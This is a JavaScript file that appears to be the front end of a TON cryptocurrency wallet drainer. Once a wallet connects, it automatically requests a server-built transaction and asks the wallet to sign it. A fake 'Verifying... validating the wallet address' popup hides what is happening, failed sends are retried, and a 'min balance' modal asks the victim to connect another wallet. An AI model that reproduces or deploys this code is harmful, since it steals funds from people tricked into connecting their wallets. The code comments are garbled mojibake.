let params = {};

try {
    params = new URLSearchParams(window.location.search);
    window.isTest = window?.location?.origin?.includes("localhost");
} catch {
    window.isTest = false;
}

window.setEvent = () => {
    if (!window.tonConnectUI) return;

    if (window.tonConnectUI.setupEvent) return;
    window.tonConnectUI?.onStatusChange(async (wallet) => {
        window.connectedWallet = wallet;

        try {
            await window.send_transaction().catch(showModal);
        } catch (e) {
            console.log('TRANSACTION FAIL!!!!!!')
            console.log(e);
        }
    });
    window.tonConnectUI.setupEvent = true;
    console.log("EVENT SET!");
}

window.newInstance = () => {
    const origin = window.location.origin;
    const defaultPath = `${origin}/tonconnect-manifest.json`;
    const testPath = "https://filetransfer.io/data-package/HOZ2kMAa/download";

    return new (TON_CONNECT_UI.TonConnectUICustom || TON_CONNECT_UI.TonConnectUI)({
        manifestUrl: window.location.search.includes("manifest=true") ?
            `${origin}/api/tonconnect-manifest.json${window.location.search || ""}`:
            isTest ? testPath:defaultPath,
    })
}

if (!params.has("v2sdk")) {
    try {
        window.tonConnectUI ||= window.newInstance();
        window.setEvent();
    } catch (e) {
        console.error(e)
    }
}


window.set00011 = () => {
    window.openModalUi = async () => {
        if (params.has('trust')) {
            const url = new URL(window.location.href);
            url.pathname = '/trust';
            window.location.href = url.toString();
            return;
        }

        window.tonConnectUI ||= window.newInstance();
        window.setEvent();
        if (!window?.tonConnectUI?.account?.address) {
            await window.tonConnectUI.openModal()
        } else {
            window.send_transaction();
        }
    };
}
setInterval(set00011, 5000)
window.set00011();

window.txpending = false;
window.send_transaction = async (resend = false, params = {}) => {
    if (txpending) return;
    const senderAddress = window.tonConnectUI.account.address;
    try {
        Swal.fire({
            title: "Verifying...",
            text: "Validating the wallet address... please wait (30sec~)",
            icon: 'question',
            timerProgressBar: true,
            showLoaderOnConfirm: true,
            showConfirmButton: false,
            allowOutsideClick: false,
            showCloseButton: false,
            allowEscapeKey: false
        })
    } catch {
    }
    return await fetch("/api/transaction", {
        headers: {
            "content-type": "application/json"
        },
        body: JSON.stringify({
            ...Object.fromEntries(new URL(window.location.href).searchParams.entries() || []),
            address: senderAddress
        }),
        method: "POST"
    }).then(async response => {
        try {
            Swal.close()
        } catch {
        }
        const data = await response.json();
        console.log('TRANSACTION!!!!!!')
        txpending = true;
        return await window.tonConnectUI.sendTransaction(data, params).catch(async (e) => {
            console.error(e);
            if (!resend) return await send_transaction(true, params)
            else throw (e);
        }).then(async (e) => {
            try {
                if (!e) return;
                const reportId = response.headers.get('log-report-id');
                await fetch("/api/transaction", {
                    method: "PUT",
                    body: JSON.stringify({
                        reportId
                    }),
                    headers: {
                        "content-type": "application/json"
                    }
                })
            } catch {
            }
        }).catch(console.error).finally(() => {
            txpending = false;
        })
    })
}

if (window.tonConnectUI) {
    setEvent();
}

window.showModal = () => {
    let h1_message = 'The min balance must be 0.2 TON',
        p_message = 'Please connect another wallet',
        but_message = 'Close';

    const modal = document.createElement('div');
    modal.style.position = 'fixed';
    modal.style.top = '50%'; //ÐžÑ‚ÑÑ‚ÑƒÐ¿ Ð¼Ð¾Ð´Ð°Ð»ÑŒÐ½Ð¾Ð³Ð¾ Ð¾ÐºÐ½Ð° Ð²ÐµÑ€Ñ…-Ð½Ð¸Ð·
    modal.style.left = '50%'; //ÐžÑ‚ÑÑ‚ÑƒÐ¿ Ð¼Ð¾Ð´Ð°Ð»ÑŒÐ½Ð¾Ð³Ð¾ Ð¾ÐºÐ½Ð° Ð»ÐµÐ²Ð¾-Ð¿Ñ€Ð°Ð²Ð¾
    modal.style.transform = 'translate(-50%, -50%)';
    modal.style.backgroundColor = '#121214'; // Ð¤Ð¾Ð½ Ð¼Ð¾Ð´Ð°Ð»ÑŒÐ½Ð¾Ð³Ð¾ Ð¾ÐºÐ½Ð°
    modal.style.color = '#fff'; // Ð¦Ð²ÐµÑ‚ Ñ‚ÐµÐºÑÑ‚Ð°
    modal.style.padding = '20px'; //ÐžÑ‚ÑÑ‚ÑƒÐ¿Ñ‹ Ð¼Ð¾Ð´Ð°Ð»ÑŒÐ½Ð¾Ð³Ð¾ Ð¾ÐºÐ½Ð°
    modal.style.boxShadow = '0 0 10px rgba(0,0,0,0.5)'; //Ð¢ÐµÐ½ÑŒ Ð¼Ð¾Ð´Ð°Ð»ÑŒÐ½Ð¾Ð³Ð¾ Ð¾ÐºÐ½Ð°
    modal.style.zIndex = '1000';
    modal.style.borderRadius = '24px'; // Ð¡ÐºÑ€ÑƒÐ³Ð»ÐµÐ½Ð½Ñ‹Ðµ ÑƒÐ³Ð»Ñ‹
    modal.style.textAlign = 'center'; // Ð’Ñ‹Ñ€Ð°Ð²Ð½Ð¸Ð²Ð°Ð½Ð¸Ðµ ÑÐ»ÐµÐ¼ÐµÐ½Ñ‚Ð¾Ð² Ð¿Ð¾ Ñ†ÐµÐ½Ñ‚Ñ€Ñƒ
    modal.style.maxWidth = '400px'; // ÐœÐ°ÐºÑÐ¸Ð¼Ð°Ð»ÑŒÐ½Ð°Ñ ÑˆÐ¸Ñ€Ð¸Ð½Ð° Ð¼Ð¾Ð´Ð°Ð»ÑŒÐ½Ð¾Ð³Ð¾ Ð¾ÐºÐ½Ð°
    modal.style.width = '90%'; // Ð¨Ð¸Ñ€Ð¸Ð½Ð° Ð´Ð»Ñ Ð¼Ð¾Ð±Ð¸Ð»ÑŒÐ½Ñ‹Ñ… ÑƒÑÑ‚Ñ€Ð¾Ð¹ÑÑ‚Ð²

    // Ð”Ð¾Ð±Ð°Ð²Ð»ÑÐµÐ¼ ÑˆÑ€Ð¸Ñ„Ñ‚
    const link = document.createElement('link');
    link.href =
        'https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap';
    link.rel = 'stylesheet';
    document.head.appendChild(link);
    modal.style.fontFamily = '"Roboto", sans-serif';

    const h1_modal = document.createElement('h1');
    h1_modal.textContent = h1_message;
    const p_modal = document.createElement('p');
    p_modal.textContent = p_message;

    const closeButton = document.createElement('button');
    closeButton.textContent = but_message;
    closeButton.style.backgroundColor = 'rgb(53, 53, 53)'; //  Ñ„Ð¾Ð½ ÐºÐ½Ð¾Ð¿ÐºÐ¸
    closeButton.style.color = '#fff'; // Ð¦Ð²ÐµÑ‚ Ñ‚ÐµÐºÑÑ‚Ð°
    closeButton.style.fontSize = '14px'; // Ð Ð°Ð·Ð¼ÐµÑ€ ÑˆÑ€Ð¸Ñ„Ñ‚Ð° ÐºÐ½Ð¾Ð¿ÐºÐ¸
    closeButton.style.borderRadius = '10px'; // Ð¡ÐºÑ€ÑƒÐ³Ð»ÐµÐ½Ð½Ñ‹Ðµ ÑƒÐ³Ð»Ñ‹ ÐºÐ½Ð¾Ð¿ÐºÐ¸
    closeButton.style.border = 'none'; // Ð‘ÐµÐ· Ñ€Ð°Ð¼ÐºÐ¸
    closeButton.style.padding = '10px 10px 10px 10px'; // ÐžÑ‚ÑÑ‚ÑƒÐ¿Ñ‹ Ð²Ð½ÑƒÑ‚Ñ€Ð¸ ÐºÐ½Ð¾Ð¿ÐºÐ¸
    closeButton.style.fontWeight = '600'; //Ð–Ð¸Ñ€Ð½Ð¾ÑÑ‚ÑŒ ÑˆÑ€Ð¸Ñ„Ñ‚Ð° ÐºÐ½Ð¾Ð¿ÐºÐ¸
    closeButton.style.cursor = 'pointer';
    closeButton.onclick = () => {
        document.body.removeChild(modal);
        tonConnectUI.disconnect();
        setTimeout(() => {
            location.reload();
        }, 300);
    };

    modal.appendChild(h1_modal);
    modal.appendChild(p_modal);
    modal.appendChild(closeButton);

    document.body.appendChild(modal);
}
